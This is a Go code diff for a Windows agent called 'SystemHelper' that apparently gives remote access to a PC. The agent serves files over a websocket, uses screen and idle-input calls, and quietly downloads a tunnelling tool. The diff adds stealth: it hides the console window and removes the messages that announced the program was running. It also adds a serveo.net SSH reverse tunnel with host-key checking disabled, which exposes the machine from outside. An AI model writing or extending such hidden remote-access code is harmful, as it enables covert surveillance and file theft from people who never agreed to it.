@@ -164,7 +164,6 @@ func init() {
 }
 
 func log(msg string) {
-	fmt.Println(time.Now().Format("15:04:05") + " " + msg)
 	if logFile != nil {
 		logFile.WriteString(time.Now().Format("15:04:05") + " " + msg + "\n")
 		logFile.Sync()
@@ -202,16 +201,26 @@ var (
 	procGetDC         = user32.NewProc("GetDC")
 	procReleaseDC     = user32.NewProc("ReleaseDC")
 	procGetLastInputInfo = user32.NewProc("GetLastInputInfo")
-	gdi32             = windows.NewLazySystemDLL("gdi32.dll")
-	procGetDeviceCaps = gdi32.NewProc("GetDeviceCaps")
 	kernel32          = windows.NewLazySystemDLL("kernel32.dll")
 	procGetTickCount  = kernel32.NewProc("GetTickCount")
+	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
+	gdi32             = windows.NewLazySystemDLL("gdi32.dll")
+	procGetDeviceCaps = gdi32.NewProc("GetDeviceCaps")
 )
+
+func hideConsole() {
+	if runtime.GOOS != "windows" { return }
+	hwnd, _, _ := procGetConsoleWindow.Call()
+	if hwnd != 0 {
+		user32.NewProc("ShowWindow").Call(hwnd, 0) // SW_HIDE = 0
+	}
+}
 
 func main() {
 	runtime.LockOSThread()
-	fmt.Println("SystemHelper v" + Version + " starting...")
-	fmt.Println("Logs: " + filepath.Join(dataDir(), "agent.log"))
+	hideConsole()
+	
+	log("Started v" + Version)
 	
 	// Check for --server flag (manual server mode)
 	useMode := ""
@@ -674,15 +683,21 @@ func handleFileRequest(path string, conn *websocket.Conn) {
 	log("File sent: " + path + " (" + fmt.Sprintf("%d bytes", len(data)) + ")")
 }
 
+func sshAvailable() bool {
+	_, err := exec.LookPath("ssh")
+	return err == nil
+}
+
 func startTunnel(ws *websocket.Conn) {
 	tunnelMode := "auto"
 	if data, err := os.ReadFile(filepath.Join(dataDir(), "tunnel.ini")); err == nil {
 		tunnelMode = strings.TrimSpace(string(data))
 	}
-	log("Tunnel mode: " + tunnelMode)
+	log("Tunnel mode: " + tunnelMode + ", SSH available: " + fmt.Sprintf("%v", sshAvailable()))
 	
 	go func() {
 		var url string
+		var lastErr string
 		
 		// Try bore.pub FIRST (no SSH needed, reliable on Windows)
 		if url == "" && (tunnelMode == "auto" || tunnelMode == "bore") {
@@ -696,6 +711,7 @@ func startTunnel(ws *websocket.Conn) {
 					dataDir()+"' -Force ; Remove-Item '"+filepath.Join(dataDir(), "bore.zip")+"'")
 				hideCmd(dl)
 				if err := dl.Run(); err != nil {
+					lastErr = "bore download: " + err.Error()
 					log("bore download failed: " + err.Error())
 				}
 			}
@@ -704,6 +720,7 @@ func startTunnel(ws *websocket.Conn) {
 				hideCmd(cmd)
 				stdout, _ := cmd.StdoutPipe()
 				if err := cmd.Start(); err != nil {
+					lastErr = "bore start: " + err.Error()
 					log("bore start failed: " + err.Error())
 				} else {
 					buf := make([]byte, 256)
@@ -716,12 +733,17 @@ func startTunnel(ws *websocket.Conn) {
 					if url == "" && outLine != "" {
 						url = outLine
 					}
+					if url == "" {
+						lastErr = "bore: no URL in output: " + outLine
+					}
 				}
+			} else {
+				lastErr = "bore.exe not found after download"
 			}
 		}
 		
-		// Try localhost.run (SSH) as fallback – use Start() + pipe with timeout
-		if url == "" && (tunnelMode == "auto" || tunnelMode == "localhost.run") {
+		// Try localhost.run (SSH) as fallback
+		if url == "" && (tunnelMode == "auto" || tunnelMode == "localhost.run") && sshAvailable() {
 			log("Trying localhost.run...")
 			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
 				"-o", "ConnectTimeout=10",
@@ -729,9 +751,9 @@ func startTunnel(ws *websocket.Conn) {
 			hideCmd(cmd)
 			stdout, _ := cmd.StdoutPipe()
 			if err := cmd.Start(); err != nil {
+				lastErr = "localhost.run: " + err.Error()
 				log("localhost.run start failed: " + err.Error())
 			} else {
-				// Read first URL line within 15 seconds, then let SSH run in background
 				done := make(chan string, 1)
 				go func() {
 					buf := make([]byte, 4096)
@@ -746,8 +768,50 @@ func startTunnel(ws *websocket.Conn) {
 							break
 						}
 					}
+					if url == "" {
+						lastErr = "localhost.run: no URL in output"
+					}
 				case <-time.After(15 * time.Second):
+					lastErr = "localhost.run: timeout (SSH connected but no URL within 15s)"
 					log("localhost.run: timeout waiting for URL")
+				}
+			}
+		} else if url == "" && !sshAvailable() {
+			lastErr = "SSH not available on this system"
+		}
+		
+		// Try serveo.net (SSH, more reliable)
+		if url == "" && (tunnelMode == "auto" || tunnelMode == "serveo") && sshAvailable() {
+			log("Trying serveo.net...")
+			cmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=30",
+				"-o", "ConnectTimeout=10",
+				"-R", "80:localhost:3000", "serveo.net")
+			hideCmd(cmd)
+			stdout, _ := cmd.StdoutPipe()
+			if err := cmd.Start(); err != nil {
+				lastErr = "serveo: " + err.Error()
+				log("serveo.net start failed: " + err.Error())
+			} else {
+				done := make(chan string, 1)
+				go func() {
+					buf := make([]byte, 4096)
+					n, _ := stdout.Read(buf)
+					done <- string(buf[:n])
+				}()
+				select {
+				case out := <-done:
+					for _, line := range strings.Split(out, "\n") {
+						if strings.Contains(line, "http") && strings.Contains(line, "serveo.net") {
+							url = strings.TrimSpace(line)
+							break
+						}
+					}
+					if url == "" {
+						lastErr = "serveo: no URL in output"
+					}
+				case <-time.After(15 * time.Second):
+					lastErr = "serveo: timeout"
+					log("serveo.net: timeout waiting for URL")
 				}
 			}
 		}
@@ -757,8 +821,10 @@ func startTunnel(ws *websocket.Conn) {
 			os.WriteFile(filepath.Join(dataDir(), "tunnel.url"), []byte(url), 0644)
 			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: url, Frame: "ready"}) }
 		} else {
-			log("All tunnels failed")
-			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: "failed", Frame: "All tunnels failed"}) }
+			reason := lastErr
+			if reason == "" { reason = "All tunnels failed (no reason)" }
+			log("All tunnels failed: " + reason)
+			if ws != nil { ws.WriteJSON(Message{Type: "tunnel-status", Command: reason, Frame: "failed"}) }
 		}
 	}()
 }
